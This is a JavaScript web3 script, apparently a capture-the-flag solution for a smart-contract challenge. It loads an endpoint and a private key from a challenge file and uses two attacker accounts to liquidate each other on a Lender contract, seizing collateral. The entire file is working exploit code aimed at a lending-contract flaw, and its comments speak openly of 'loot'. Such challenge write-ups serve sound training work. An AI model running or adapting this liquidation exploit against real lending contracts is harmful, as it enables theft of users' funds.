// import data
const challengeData =			require("./challenge2.json");
const setupABIsetup =			require("./setupABIsetup.json");
const lenderABIlender =			require("./lenderABIlender.json");
		
const {attackdouble} =			require("./attackdouble.js");

const ENDPOINT =			challengeData["RPC endpoint"];
const SETUPACCT =			challengeData["Setup contract"];
const ATTACKPRIKEY =			challengeData["Private key"];

// setup
const Web3 = require("web3");

// connect
const web3 = new Web3(ENDPOINT);

async function main() {

	try {	

		// get attacker account so I can check my loot
		var ATTACKACCT = await web3.eth.getAccounts();
		ATTACKACCT = ATTACKACCT.toString();

		// get second attack account
		const ATTACKDBL = attackdouble.address;
		const ATTACKDBLPRIKEY = attackdouble.privateKey;

		// init Setup contract
		const Setup = new web3.eth.Contract(setupABIsetup, SETUPACCT);

		// get lender address
		const lender = await Setup.methods.lender().call();

		// init Lender contract
		const Lender = new web3.eth.Contract(lenderABIlender, lender);

		// calculate safeDebt max to borrow
		var safeDebt = await Lender.methods.safeDebt(ATTACKACCT).call();

		// liquidate attack account and redeem weth
		var Liquidate = await Lender.methods.liquidate(ATTACKACCT, safeDebt).encodeABI();
    		var LiquidateTX = {
			to: lender,
       			from: ATTACKDBL,
			gas: 1000000,
        		data: Liquidate,
		};
		var signedTX = await web3.eth.accounts.signTransaction(LiquidateTX, ATTACKDBLPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("Liquidate TX hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

		// repeat liquidation for attack double account
		safeDebt = await Lender.methods.safeDebt(ATTACKDBL).call();
		Liquidate = await Lender.methods.liquidate(ATTACKDBL, safeDebt).encodeABI();
    		LiquidateTX = {
			to: lender,
       			from: ATTACKACCT,
			gas: 1000000,
        		data: Liquidate,
		};
		signedTX = await web3.eth.accounts.signTransaction(LiquidateTX, ATTACKPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("Liquidate TX hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

	} catch (error) {
		
		// catch any random errors
		console.log("Error: " + error);
	}
}

main();
